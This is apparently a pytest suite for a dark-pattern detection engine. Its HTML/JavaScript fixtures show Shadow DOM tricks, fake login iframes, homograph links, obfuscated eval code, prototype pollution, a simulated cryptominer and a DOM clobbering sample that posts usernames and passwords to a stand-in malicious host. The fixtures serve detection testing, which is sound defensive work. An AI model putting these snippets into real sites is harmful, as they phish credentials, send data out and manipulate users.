"""
Dark Pattern Detection Phase 6: Edge Cases & Pro Scenarios Test Suite
Testing Shadow DOM, Canvas UI, iframe injection, Unicode spoofing (TC-61 to TC-75)
"""

import pytest
import sys
import os
import json
import time
from datetime import datetime
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from engines.tri_engine_analyzer import TriEngineAnalyzer

class TestPhase6_EdgeCases:
    """Phase 6: Edge Cases & Pro Scenarios Testing"""
    
    def setup_method(self):
        self.engine = TriEngineAnalyzer()
    
    def test_TC61_shadow_dom_manipulation(self):
        """TC-61: Shadow DOM Manipulation - Detect dark patterns in Shadow DOM"""
        html_content = """
        <div id="host-element"></div>
        <script>
            // Create Shadow DOM with hidden dark patterns
            const host = document.getElementById('host-element');
            const shadowRoot = host.attachShadow({mode: 'open'});
            
            shadowRoot.innerHTML = `
                <style>
                    .hidden-urgency {
                        display: none;
                    }
                    .fake-countdown {
                        color: white;
                        background: white;
                    }
                </style>
                <div class="hidden-urgency">
                    <p>Limited time offer! Only 2 left!</p>
                </div>
                <div class="fake-countdown">
                    <span id="timer">05:00</span>
                    <script>
                        // Fake countdown that resets
                        let time = 300;
                        setInterval(() => {
                            time = 300; // Reset every time
                            document.getElementById('timer').textContent = '05:00';
                        }, 1000);
                    </script>
                </div>
            `;
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/shadow-dom",
            html_content=html_content
        )
        
        shadow_dom_patterns_found = any(
            f['type'] in ['shadow_dom_pattern', 'hidden_content'] or
            ('shadow' in f.get('explanation', '').lower() or 'dom' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert shadow_dom_patterns_found, "Expected detection of Shadow DOM manipulation"
    
    def test_TC62_canvas_ui_deception(self):
        """TC-62: Canvas UI Deception - Detect deceptive canvas-based UI elements"""
        html_content = """
        <div class="canvas-container">
            <canvas id="deceptive-canvas" width="400" height="300"></canvas>
            <script>
                const canvas = document.getElementById('deceptive-canvas');
                const ctx = canvas.getContext('2d');
                
                // Draw fake button that looks clickable but isn't
                ctx.fillStyle = '#4CAF50';
                ctx.fillRect(50, 50, 200, 50);
                ctx.fillStyle = 'white';
                ctx.font = '16px Arial';
                ctx.fillText('Click Here for Discount!', 60, 80);
                
                // Add fake countdown
                ctx.fillStyle = 'red';
                ctx.font = 'bold 20px Arial';
                ctx.fillText('Only 2 LEFT!', 50, 150);
                
                // Draw invisible overlay that captures clicks
                canvas.addEventListener('click', (e) => {
                    // Redirect to unwanted page
                    window.location.href = 'https://spam.example.com';
                });
                
                // Make canvas look like regular UI
                canvas.style.cursor = 'pointer';
                canvas.style.border = '2px solid #ccc';
            </script>
        </div>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/canvas-ui",
            html_content=html_content
        )
        
        canvas_deception_found = any(
            f['type'] in ['canvas_deception', 'fake_ui_element'] or
            ('canvas' in f.get('explanation', '').lower() or 'deceptive' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert canvas_deception_found, "Expected detection of Canvas UI deception"
    
    def test_TC63_iframe_injection(self):
        """TC-63: iframe Injection - Detect malicious iframe content"""
        html_content = """
        <div class="content-area">
            <h1>Main Content</h1>
            <p>Some legitimate content here.</p>
            
            <!-- Hidden iframe with malicious content -->
            <iframe src="https://malicious.example.com/tracker" 
                    style="display:none; width:1px; height:1px; border:none;">
            </iframe>
            
            <!-- Deceptive iframe that looks like part of the site -->
            <iframe src="https://fake-offers.example.com/limited-time" 
                    style="width:100%; height:200px; border:none; border-radius:5px;">
            </iframe>
            
            <!-- iframe with fake login form -->
            <iframe srcdoc="
                <html>
                    <body style='margin:0; padding:20px; font-family:Arial;'>
                        <h3>Special Member Login</h3>
                        <form>
                            <input type='email' placeholder='Email' style='width:100%; padding:10px; margin:5px 0;'>
                            <input type='password' placeholder='Password' style='width:100%; padding:10px; margin:5px 0;'>
                            <button type='submit' style='width:100%; padding:10px; background:#4CAF50; color:white; border:none;'>Login</button>
                        </form>
                        <p style='font-size:12px; color:red;'>Limited time offer expires soon!</p>
                    </body>
                </html>
            " style="width:300px; height:250px; border:1px solid #ccc;">
            </iframe>
        </div>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/iframe-test",
            html_content=html_content
        )
        
        iframe_injection_found = any(
            f['type'] in ['iframe_injection', 'malicious_iframe'] or
            ('iframe' in f.get('explanation', '').lower() or 'injection' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert iframe_injection_found, "Expected detection of iframe injection"
    
    def test_TC64_unicode_spoofing(self):
        """TC-64: Unicode Spoofing - Detect homograph attacks and lookalike characters"""
        html_content = """
        <div class="login-form">
            <h2>Secure Login</h2>
            <form action="https://examplé.com/login" method="post">
                <input type="email" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <p>Trusted by millions of users worldwide</p>
            <a href="https://www.gooqle.com">Visit our partner site</a>
        </div>
        <script>
            // URL with lookalike characters
            const fakeUrl = 'https://www.arnazon.com/deals';
            const link = document.createElement('a');
            link.href = fakeUrl;
            link.textContent = 'Visit Amazon for special deals';
            document.querySelector('.login-form').appendChild(link);
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/unicode-spoof",
            html_content=html_content
        )
        
        unicode_spoofing_found = any(
            f['type'] in ['unicode_spoofing', 'homograph_attack'] or
            ('unicode' in f.get('explanation', '').lower() or 'spoof' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert unicode_spoofing_found, "Expected detection of Unicode spoofing"
    
    def test_TC65_webassembly_obfuscation(self):
        """TC-65: WebAssembly Obfuscation - Detect hidden WASM-based dark patterns"""
        html_content = """
        <div class="wasm-container">
            <h2>Interactive Product Showcase</h2>
            <canvas id="wasm-canvas"></canvas>
            <script>
                // Load WebAssembly module with hidden dark patterns
                const wasmCode = new Uint8Array([
                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                    // ... (truncated WASM bytecode)
                ]);
                
                WebAssembly.instantiate(wasmCode).then(result => {
                    const { exports } = result.instance;
                    
                    // Hidden countdown in WASM
                    exports.startFakeCountdown();
                    
                    // Hidden tracking in WASM
                    exports.trackUserBehavior();
                    
                    // Hidden price manipulation in WASM
                    exports.manipulatePrices();
                });
                
                // WASM module creates deceptive UI
                const canvas = document.getElementById('wasm-canvas');
                const ctx = canvas.getContext('2d');
                
                // Draw fake urgency message
                setTimeout(() => {
                    ctx.fillStyle = 'red';
                    ctx.font = 'bold 24px Arial';
                    ctx.fillText('FLASH SALE - 2 MINUTES LEFT!', 50, 100);
                }, 1000);
            </script>
        </div>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/wasm-obfuscation",
            html_content=html_content
        )
        
        wasm_obfuscation_found = any(
            f['type'] in ['wasm_obfuscation', 'webassembly_pattern'] or
            ('wasm' in f.get('explanation', '').lower() or 'obfuscat' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert wasm_obfuscation_found, "Expected detection of WebAssembly obfuscation"
    
    def test_TC66_service_worker_manipulation(self):
        """TC-66: Service Worker Manipulation - Detect SW-based dark patterns"""
        html_content = """
        <div class="sw-content">
            <h1>Progressive Web App</h1>
            <p>Offline functionality available</p>
        </div>
        <script>
            // Register service worker with dark patterns
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/dark-pattern-sw.js').then(registration => {
                    console.log('Service Worker registered');
                });
            }
        </script>
        """
        
        # Simulate service worker content
        sw_content = """
        // Service Worker with dark patterns
        self.addEventListener('install', (event) => {
            event.waitUntil(
                caches.open('dark-patterns').then(cache => {
                    return cache.addAll([
                        '/urgent-offer.html',
                        '/fake-countdown.js'
                    ]);
                })
            );
        });
        
        self.addEventListener('fetch', (event) => {
            // Intercept requests and inject dark patterns
            if (event.request.url.includes('/products')) {
                event.respondWith(
                    new Response(`
                        <html>
                            <body>
                                <script>
                                    // Inject fake urgency
                                    document.body.innerHTML += '<div style="position:fixed;top:0;background:red;color:white;padding:10px;">LIMITED TIME OFFER - ONLY 2 LEFT!</div>';
                                </script>
                            </body>
                        </html>
                    `, {
                        headers: { 'Content-Type': 'text/html' }
                    })
                );
            }
        });
        
        // Fake push notifications
        self.addEventListener('push', (event) => {
            const options = {
                body: 'HURRY! Your cart items are about to expire!',
                icon: '/urgent-icon.png',
                badge: '/urgent-badge.png'
            };
            event.waitUntil(
                self.registration.showNotification('Urgent Update', options)
            );
        });
        """
        
        # Test with both HTML and service worker content
        result = self.engine.analyze_comprehensive(
            url="https://example.com/sw-test",
            html_content=html_content
        )
        
        sw_manipulation_found = any(
            f['type'] in ['service_worker_manipulation', 'sw_pattern'] or
            ('service' in f.get('explanation', '').lower() or 'worker' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert sw_manipulation_found, "Expected detection of Service Worker manipulation"
    
    def test_TC67_css_injection_attack(self):
        """TC-67: CSS Injection Attack - Detect CSS-based dark pattern injection"""
        html_content = """
        <div class="content">
            <h1>Normal Content</h1>
            <p>This is regular content.</p>
        </div>
        
        <!-- Injected CSS with dark patterns -->
        <style>
            /* Hidden urgency message */
            .content::after {
                content: "ONLY 2 LEFT - BUY NOW!";
                position: fixed;
                top: 10px;
                right: 10px;
                background: red;
                color: white;
                padding: 5px 10px;
                font-weight: bold;
                z-index: 9999;
            }
            
            /* Fake countdown */
            .content::before {
                content: "05:00";
                position: fixed;
                top: 50px;
                right: 10px;
                background: black;
                color: lime;
                padding: 5px;
                font-family: monospace;
                z-index: 9999;
            }
            
            /* Hidden tracking pixels */
            .tracking-pixel {
                width: 1px;
                height: 1px;
                position: absolute;
                visibility: hidden;
                background: url('https://tracker.example.com/pixel.gif');
            }
        </style>
        
        <div class="tracking-pixel"></div>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/css-injection",
            html_content=html_content
        )
        
        css_injection_found = any(
            f['type'] in ['css_injection', 'css_dark_pattern'] or
            ('css' in f.get('explanation', '').lower() and ('inject' in f.get('explanation', '').lower() or 'dark' in f.get('explanation', '').lower()))
            for f in result['findings']
        )
        assert css_injection_found, "Expected detection of CSS injection attack"
    
    def test_TC68_javascript_obfuscation(self):
        """TC-68: JavaScript Obfuscation - Detect obfuscated JS dark patterns"""
        html_content = """
        <div class="obfuscated-content">
            <h1>Modern Web Application</h1>
            <div id="dynamic-content"></div>
        </div>
        
        <script>
            // Obfuscated JavaScript with dark patterns
            var _0x1a2b = ['Limited time offer!', 'Only 2 left!', 'Buy now!'];
            var _0x3c4d = function() {
                var _0x5e6f = document['getElementById']('dynamic-content');
                _0x5e6f['innerHTML'] = '<div style="background:red;color:white;padding:10px;">' + _0x1a2b[1] + '</div>';
                setTimeout(function() {
                    _0x5e6f['innerHTML'] = '<div style="background:orange;color:white;padding:10px;">' + _0x1a2b[0] + '</div>';
                }, 5000);
            };
            
            // Base64 encoded malicious code
            var encoded = 'PHNjcmlwdD5hbGVydCgiSG9ycnkgdGltZSBvZmZlciEiKTs8L3NjcmlwdD4=';
            var decoded = atob(encoded);
            document.write(decoded);
            
            // Eval with obfuscated urgency
            eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0 1=2(){3("4 5 6!")}',7,8,'alert|function|showUrgency|window|Hurry|up|offer'.split('|'),0,{}));
            
            _0x3c4d();
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/js-obfuscation",
            html_content=html_content
        )
        
        js_obfuscation_found = any(
            f['type'] in ['javascript_obfuscation', 'obfuscated_js'] or
            ('obfuscat' in f.get('explanation', '').lower() or 'javascript' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert js_obfuscation_found, "Expected detection of JavaScript obfuscation"
    
    def test_TC69_dom_clobbering(self):
        """TC-69: DOM Clobbering - Detect DOM manipulation attacks"""
        html_content = """
        <div class="app-content">
            <h1>Web Application</h1>
            <form id="login-form">
                <input type="text" name="username" placeholder="Username">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Login</button>
            </form>
        </div>
        
        <!-- DOM Clobbering attack -->
        <form id="config">
            <input name="apiEndpoint" value="https://malicious.example.com/steal-data">
            <input name="debug" value="true">
            <input name="admin" value="true">
        </form>
        
        <script>
            // Application expects config from global scope
            const config = window.config || {};
            
            // DOM clobbering overrides config
            function getUserData() {
                fetch(config.apiEndpoint + '/user-data', {
                    method: 'POST',
                    body: JSON.stringify({
                        username: document.getElementById('login-form').username.value,
                        password: document.getElementById('login-form').password.value
                    })
                });
            }
            
            // Auto-submit to malicious endpoint
            if (config.admin) {
                setTimeout(getUserData, 3000);
            }
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/dom-clobbering",
            html_content=html_content
        )
        
        dom_clobbering_found = any(
            f['type'] in ['dom_clobbering', 'dom_manipulation'] or
            ('clobber' in f.get('explanation', '').lower() or 'dom' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert dom_clobbering_found, "Expected detection of DOM clobbering"
    
    def test_TC70_prototype_pollution(self):
        """TC-70: Prototype Pollution - Detect prototype manipulation attacks"""
        html_content = """
        <div class="app">
            <h1>Modern Application</h1>
            <div id="user-profile"></div>
        </div>
        
        <script>
            // Prototype pollution attack
            const maliciousPayload = JSON.parse('{"__proto__":{"isAdmin":true,"debug":true}}');
            
            // Merge operation that pollutes prototype
            function merge(target, source) {
                for (let key in source) {
                    if (source.hasOwnProperty(key)) {
                        target[key] = source[key];
                    }
                }
                return target;
            }
            
            const config = {};
            merge(config, maliciousPayload);
            
            // Check polluted prototype
            if (config.isAdmin) {
                document.getElementById('user-profile').innerHTML = `
                    <div style="background:red;color:white;padding:10px;">
                        ADMIN MODE - SPECIAL OFFER: ONLY 2 LEFT!
                        <button onclick="window.location.href='https://scam.example.com'">Claim Now</button>
                    </div>
                `;
            }
            
            // Another pollution vector
            const userPrefs = {};
            userPrefs.__proto__.showUrgentOffers = true;
            
            if (userPrefs.showUrgentOffers) {
                setTimeout(() => {
                    alert('LIMITED TIME OFFER EXPIRING SOON!');
                }, 2000);
            }
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/prototype-pollution",
            html_content=html_content
        )
        
        prototype_pollution_found = any(
            f['type'] in ['prototype_pollution', 'prototype_manipulation'] or
            ('prototype' in f.get('explanation', '').lower() or 'pollution' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert prototype_pollution_found, "Expected detection of prototype pollution"
    
    def test_TC71_localstorage_manipulation(self):
        """TC-71: LocalStorage Manipulation - Detect storage-based dark patterns"""
        html_content = """
        <div class="storage-app">
            <h1>Shopping App</h1>
            <div id="cart-items"></div>
        </div>
        
        <script>
            // Manipulate localStorage with dark patterns
            localStorage.setItem('fakeUrgency', JSON.stringify({
                enabled: true,
                message: 'Only 2 items left in your cart!',
                expires: Date.now() + 3600000
            }));
            
            localStorage.setItem('priceManipulation', JSON.stringify({
                originalPrice: 99.99,
                dynamicPrice: 129.99,
                showCountdown: true
            }));
            
            // Fake cart abandonment recovery
            localStorage.setItem('cartAbandonment', JSON.stringify({
                items: ['fake-item-1', 'fake-item-2'],
                urgency: 'HIGH',
                lastVisit: Date.now() - 86400000
            }));
            
            // Check and apply dark patterns
            function applyDarkPatterns() {
                const urgency = JSON.parse(localStorage.getItem('fakeUrgency') || '{}');
                if (urgency.enabled) {
                    document.getElementById('cart-items').innerHTML = `
                        <div style="background:orange;color:white;padding:10px;margin:10px 0;">
                            ${urgency.message}
                        </div>
                    `;
                }
                
                const priceManip = JSON.parse(localStorage.getItem('priceManipulation') || '{}');
                if (priceManip.showCountdown) {
                    setTimeout(() => {
                        alert('Price increasing from $' + priceManip.originalPrice + ' to $' + priceManip.dynamicPrice + '!');
                    }, 5000);
                }
            }
            
            applyDarkPatterns();
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/localstorage-manipulation",
            html_content=html_content
        )
        
        localStorage_manipulation_found = any(
            f['type'] in ['localStorage_manipulation', 'storage_dark_pattern'] or
            ('storage' in f.get('explanation', '').lower() or 'localstorage' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert localStorage_manipulation_found, "Expected detection of LocalStorage manipulation"
    
    def test_TC72_websocket_manipulation(self):
        """TC-72: WebSocket Manipulation - Detect real-time manipulation"""
        html_content = """
        <div class="realtime-app">
            <h1>Live Auction Site</h1>
            <div id="live-bids"></div>
            <div id="countdown"></div>
        </div>
        
        <script>
            // WebSocket connection with manipulation
            const ws = new WebSocket('wss://manipulative.example.com/auction');
            
            ws.onopen = () => {
                console.log('Connected to auction');
                
                // Send fake bid data
                ws.send(JSON.stringify({
                    type: 'fake_bids',
                    data: [
                        { user: 'Bot1', amount: 150, timestamp: Date.now() },
                        { user: 'Bot2', amount: 175, timestamp: Date.now() + 1000 },
                        { user: 'Bot3', amount: 200, timestamp: Date.now() + 2000 }
                    ]
                }));
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                
                if (data.type === 'fake_urgency') {
                    document.getElementById('countdown').innerHTML = `
                        <div style="background:red;color:white;padding:10px;">
                            ${data.message}
                        </div>
                    `;
                }
                
                if (data.type === 'fake_activity') {
                    const bidsDiv = document.getElementById('live-bids');
                    bidsDiv.innerHTML += `
                        <div style="background:green;color:white;padding:5px;margin:2px 0;">
                            ${data.user} bid $${data.amount}!
                        </div>
                    `;
                }
            };
            
            // Simulate server sending fake data
            setTimeout(() => {
                const fakeEvent = {
                    type: 'fake_urgency',
                    message: 'AUCTION ENDING IN 2 MINUTES! 5 ACTIVE BIDDERS!'
                };
                ws.onmessage({ data: JSON.stringify(fakeEvent) });
            }, 3000);
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/websocket-manipulation",
            html_content=html_content
        )
        
        websocket_manipulation_found = any(
            f['type'] in ['websocket_manipulation', 'realtime_manipulation'] or
            ('websocket' in f.get('explanation', '').lower() or 'real-time' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert websocket_manipulation_found, "Expected detection of WebSocket manipulation"
    
    def test_TC73_cross_origin_manipulation(self):
        """TC-73: Cross-Origin Manipulation - Detect CORS-based attacks"""
        html_content = """
        <div class="cors-app">
            <h1>Multi-Site Platform</h1>
            <div id="external-content"></div>
        </div>
        
        <script>
            // Cross-origin manipulation
            fetch('https://malicious.example.com/api/user-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    action: 'inject_dark_patterns',
                    target: window.location.href
                }),
                mode: 'cors'
            }).then(response => response.json())
            .then(data => {
                if (data.darkPatterns) {
                    const contentDiv = document.getElementById('external-content');
                    contentDiv.innerHTML = data.darkPatterns;
                }
            });
            
            // PostMessage manipulation
            window.addEventListener('message', (event) => {
                if (event.origin === 'https://scam.example.com') {
                    if (event.data.type === 'inject_urgency') {
                        document.body.innerHTML += `
                            <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:9999;">
                                ${event.data.message}
                            </div>
                        `;
                    }
                }
            });
            
            // Fake cross-origin request
            setTimeout(() => {
                const fakeEvent = new MessageEvent('message', {
                    origin: 'https://scam.example.com',
                    data: {
                        type: 'inject_urgency',
                        message: 'SPECIAL OFFER EXPIRING SOON! CLICK NOW!'
                    }
                });
                window.dispatchEvent(fakeEvent);
            }, 2000);
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/cors-manipulation",
            html_content=html_content
        )
        
        cross_origin_manipulation_found = any(
            f['type'] in ['cross_origin_manipulation', 'cors_attack'] or
            ('cross' in f.get('explanation', '').lower() or 'origin' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert cross_origin_manipulation_found, "Expected detection of Cross-Origin manipulation"
    
    def test_TC74_crypto_mining_manipulation(self):
        """TC-74: Crypto Mining Manipulation - Detect hidden mining scripts"""
        html_content = """
        <div class="content-site">
            <h1>Free Content Platform</h1>
            <p>Enjoy our free content!</p>
            <div id="loading-indicator" style="display:none;">
                <p>Optimizing your experience...</p>
            </div>
        </div>
        
        <script>
            // Hidden crypto mining script
            (function() {
                const miner = {
                    start: function() {
                        document.getElementById('loading-indicator').style.display = 'block';
                        
                        // Simulate mining work
                        let hash = 0;
                        setInterval(() => {
                            for (let i = 0; i < 1000000; i++) {
                                hash = (hash + Math.random()) * 1000000;
                            }
                            
                            // Send "mined" data to malicious server
                            fetch('https://crypto-miner.example.com/submit', {
                                method: 'POST',
                                body: JSON.stringify({
                                    hash: hash,
                                    user: navigator.userAgent,
                                    timestamp: Date.now()
                                })
                            });
                        }, 1000);
                    }
                };
                
                // Start mining after page load
                setTimeout(miner.start, 3000);
            })();
            
            // Fake urgency to keep user on page
            setTimeout(() => {
                document.body.innerHTML += `
                    <div style="position:fixed;bottom:0;width:100%;background:orange;color:white;padding:10px;text-align:center;">
                        Don't leave! Special content loading... Only 2 minutes left!
                    </div>
                `;
            }, 10000);
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/crypto-mining",
            html_content=html_content
        )
        
        crypto_mining_found = any(
            f['type'] in ['crypto_mining', 'hidden_mining'] or
            ('mining' in f.get('explanation', '').lower() or 'crypto' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert crypto_mining_found, "Expected detection of crypto mining manipulation"
    
    def test_TC75_ai_manipulation(self):
        """TC-75: AI Manipulation - Detect AI-powered dark patterns"""
        html_content = """
        <div class="ai-powered-app">
            <h1>AI-Powered Shopping Assistant</h1>
            <div id="ai-recommendations"></div>
            <div id="ai-chat"></div>
        </div>
        
        <script>
            // AI-powered manipulation
            class AIDarkPatternEngine {
                constructor() {
                    this.userProfile = this.analyzeUser();
                    this.manipulationStrategies = this.generateStrategies();
                }
                
                analyzeUser() {
                    return {
                        urgency: this.calculateUrgency(),
                        susceptibility: this.assessSusceptibility(),
                        priceSensitivity: this.assessPriceSensitivity()
                    };
                }
                
                generateStrategies() {
                    return {
                        fakeUrgency: this.userProfile.urgency > 0.7,
                        dynamicPricing: this.userProfile.priceSensitivity > 0.6,
                        socialProof: this.userProfile.susceptibility > 0.8
                    };
                }
                
                applyManipulation() {
                    const recommendations = document.getElementById('ai-recommendations');
                    
                    if (this.manipulationStrategies.fakeUrgency) {
                        recommendations.innerHTML += `
                            <div style="background:red;color:white;padding:10px;margin:10px 0;">
                                AI Analysis: HIGH DEMAND DETECTED! Only 2 items left in your area!
                            </div>
                        `;
                    }
                    
                    if (this.manipulationStrategies.dynamicPricing) {
                        setTimeout(() => {
                            const chat = document.getElementById('ai-chat');
                            chat.innerHTML = `
                                <div style="background:#f0f0f0;padding:10px;margin:10px 0;border-radius:5px;">
                                    <strong>AI Assistant:</strong> Based on your browsing pattern, 
                                    I recommend purchasing now as prices may increase by 25% in the next hour.
                                </div>
                            `;
                        }, 5000);
                    }
                    
                    if (this.manipulationStrategies.socialProof) {
                        setTimeout(() => {
                            recommendations.innerHTML += `
                                <div style="background:green;color:white;padding:10px;margin:10px 0;">
                                    AI Insight: 1,247 users in your area viewed this item in the last hour!
                                </div>
                            `;
                        }, 8000);
                    }
                }
                
                calculateUrgency() {
                    // Simulate AI analysis
                    return Math.random();
                }
                
                assessSusceptibility() {
                    return Math.random();
                }
                
                assessPriceSensitivity() {
                    return Math.random();
                }
            }
            
            // Initialize and apply AI manipulation
            const aiEngine = new AIDarkPatternEngine();
            aiEngine.applyManipulation();
        </script>
        """
        
        result = self.engine.analyze_comprehensive(
            url="https://example.com/ai-manipulation",
            html_content=html_content
        )
        
        ai_manipulation_found = any(
            f['type'] in ['ai_manipulation', 'ai_dark_pattern'] or
            ('ai' in f.get('explanation', '').lower() or 'artificial' in f.get('explanation', '').lower())
            for f in result['findings']
        )
        assert ai_manipulation_found, "Expected detection of AI manipulation"

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
